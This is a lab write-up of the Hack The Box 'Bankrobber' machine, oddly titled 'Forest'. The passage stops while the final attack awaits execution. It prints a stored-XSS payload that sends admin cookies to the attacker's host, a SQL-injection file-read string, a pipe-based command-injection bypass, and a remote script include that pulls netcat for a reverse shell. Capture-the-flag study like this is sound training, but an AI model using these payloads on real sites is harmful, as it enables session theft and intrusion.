# HTB: Forest Writeup w/o Metasploit
![bankrobber](https://user-images.githubusercontent.com/48168337/188629756-091014e6-20cc-4f0c-9540-2a1bb9032dbd.png)

## Introduction
Hey everybody, welcome to this writeup on HTB's Bankrobber box. This machine was pretty challenging and fun at the same time. It was ranked as insane so it may have been more than what most are used to. Anyway, let's jump right into it. 

## Recon
As always, I kicked off a few nmap scans to see what services and ports are available. 

![nmap_scan](https://user-images.githubusercontent.com/48168337/188629985-7a7b8cbf-c5f5-4e10-9ed1-fd0c29c15746.png)

As you can see we have Web services, SMB, and SQL services available. Let's check out the web services first by opening a browser and navigating to http://10.10.10.154. FYI, it'll help to have Burpsuite open and logging all of our web traffic as we're checking out the web services.


![webpage](https://user-images.githubusercontent.com/48168337/188630629-f59738cd-2730-4840-9fa8-35220ac4b373.png)

The webpage brings us to some cryptocurrency platform. After playing around with the web page, I decided to register and create an account called "test" and log into it. After logging in, you'll notice a "Transfer E-Coin" page; looks like you can transfer cryptocurrency to others using this. The transfer has to be approved by an Admin though. 

![trasnfer_on_hold](https://user-images.githubusercontent.com/48168337/188632981-53acfcf1-a46f-46aa-a361-e18e12758b48.png)

With that in mind, and the comment section on this page, I thought about a XSS (cross site scripting) attack. 

After some fuzzing around, I noticed you can exploit the comment section with XSS scripts. I tested the XSS vulnerability out with a simple script, after it worked, I created some JavaScript to try and steal cookies. I'll skip my test and get to the cookie stealing script. This `img src=x onerror=this.src=http://10.10.14.2/?cookie="btoa(document.cookie) />` is the script I used to steal the admin cookies. How or Why does it steal the admin cookies? Well the script gets executed when the admin approves/denies our transfer. After execution their cookies are forwarded to our server. For this to work, we'll need a webserver started on our box, I used python `python3 -m http.server 80` to start one up. You'll want this started up before sending the comment with our JavaScript. 

![cookie_stealer](https://user-images.githubusercontent.com/48168337/188634014-bdcb655c-f0e4-4099-abcc-e75312ad1d70.png)

![cookie_stealer_2](https://user-images.githubusercontent.com/48168337/188637185-a8b8eb3b-d4a0-4db8-b33c-4da76e0d0353.png)

It takes about a 3-5 minutes for the admin to approve our transaction, simultaneously being affected by our JavaScript. As you can see, the cookies were successfully retrieved and look encoded. They are encoded, with base64. You can decode this with any online tool, Burpsuite, or your terminal. 

![base64-decode](https://user-images.githubusercontent.com/48168337/188637813-8b353bd8-f959-424f-87c3-f893c1f0a55b.png)

![base64-decode_2](https://user-images.githubusercontent.com/48168337/188638461-5d837d03-3a9b-4db9-9d14-c0e523379677.png)

I used my terminal to do the decoding. After decoding the cookie, you'll notice you have to decode the username and password as well. And now we have Admin credentials to log into this web application. 

![admin_login](https://user-images.githubusercontent.com/48168337/188639019-5801279a-60bd-426a-aada-034da908a283.png)

After we log in, we have access to a different interface and tabs. There's a `notes.txt` tab, transactions tab, `search users` tab, and a `security tab`. We learn this is a XAMPP web application after looking at the Notes.txt page. This is good to know. FYI, default location for XAMPP on Windows is `C:/xampp/htdocs`. 

![xampp_server](https://user-images.githubusercontent.com/48168337/188639621-b4b0b801-36a5-4944-b787-048483cf1816.png)

The `search users` tab allows us to query a database for users. After some fuzzing around, we learned that this is vulnerable to SQL Injection attacks. I was able to find a few things, such as other users (`gio`) and their passwords. We were also able to load files from the system; specifically the file being used by the `backdoorchecker`. What is the backdoorchecker? It's the within the `security tab`, or you can just scroll down the page a bit and you'll find it at the bottom.

![backdoorchecker](https://user-images.githubusercontent.com/48168337/188883159-9e99ae34-9576-41e4-ba2f-c39cfc6bd2a0.png)

![backdoorchecker2](https://user-images.githubusercontent.com/48168337/188883442-09e74bd2-4701-4f84-a211-1cea545e3f98.png)

![backdoorchecker3](https://user-images.githubusercontent.com/48168337/188883408-28245182-3def-485c-8e90-a71dc46e7bae.png)

Apparently, the backdoorchecker.php script allows you to identify backdoors located on the server, but the script can only be used locally. Once again, we were able to load this file using the SQL injection vulnerability in the `search users` input field. If you enter `' UNION SELECT 1,LOAD_FILE('c:/xampp/htdocs/backdoorchecker.php'),3-- -` into the `search users` input field, it will try to load the `backdoorchecker.php` script. It may fail to load using your web browser, so try to do this in repeater using BurpSuite. I have a video walkthrough at the end where you can see me doing this.

![burp_backdoor](https://user-images.githubusercontent.com/48168337/188884523-f17629df-02a8-4105-92e0-b78d915d7e17.png)

The screenshot above (right side) is what the script looks like within burp suite after we send it. Essentially the script is checking/validating credentials and doing some input validation. For instance, it's checking what commands are being used, if they match the `$bad` variable then it error out, if the commands are not coming from `localhost` then error out. 

But the script isn't checking if we're adding a `|` to our command. Remember, we can bypass input validation by piping another command such as `cmd | ping 10.10.10.152`. But we'll still have to do this from localhost so the command can work. Therefore, we'll need to use the same xss vulnerability so the command looks like its coming from the localhost. To accomplish all of this we're going to make a script, you can see it below. 

![xss_nc.js](https://user-images.githubusercontent.com/48168337/189116761-4adc79aa-bfa9-4909-a2f0-62ba9a736408.png)


The script is pretty simple and straightforward. We're setting variables for our request, uri, and cookies. Then we're setting the request to be sent which is piping a netcat connection using `nc.exe` from our smbserver at `10.10.14.2\kali`. We'll call the script using the xss vulnerabilty, all we have to do is paste xss attack in the same input field as before. Here is what we will be pasting. `<script src="http://10.10.14.2/xss.js></script>`. I named my script xss.js.

Now lets set up the attack. We'll need an SMBserver to host what the script is using (`nc.exe`). And a webserver to host our script (`xss.js`). 

Below is our smbserver in the left panel, our webserver in the right panel, and a netcat listener on the bottom panel.

![tmux](https://user-images.githubusercontent.com/48168337/189125025-cf5165b5-88c4-4ae9-af73-36c48b1c3612.png)

We started the smbserver with the following command: `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali.` We started our python webserver with `python3 -m http.server 80`. Make sure you start those services in the same directory as your javascript (xss.js) and netcat file (nc.exe). You should be able to use the following command to copy netcat to your current directory ` cp /usr/share/windows-resources/binaries/nc.exe  .`.

We can execute our new javascript using the same input field from before or you can do it through Burpsuite using repeater. There's a screenshot below to do it both ways. In Burp, keep in mind, the payload is url encoded, without the encoding it looks like this: `<script src="http://10.10.14.2/xss.js></script>` Don't forget, I named the script xss.js. 

![burp_request](https://user-images.githubusercontent.com/48168337/189119369-cb9fed02-c552-4c62-afe4-5ad5d8f9ea20.png)

![upload-xss.js](https://user-images.githubusercontent.com/48168337/189122599-5eeef051-13b8-4e8d-b00e-4990b2c99b19.png)

You can see the transaction is waiting to be approved. I sent it a few times because my box was timing out. Now, we just have to wait for it to be executed.

![transaction_xss.js](https://user-images.githubusercontent.com/48168337/189123130-c7b895e4-8a1a-43a2-a3e6-9ae571973c74.png)

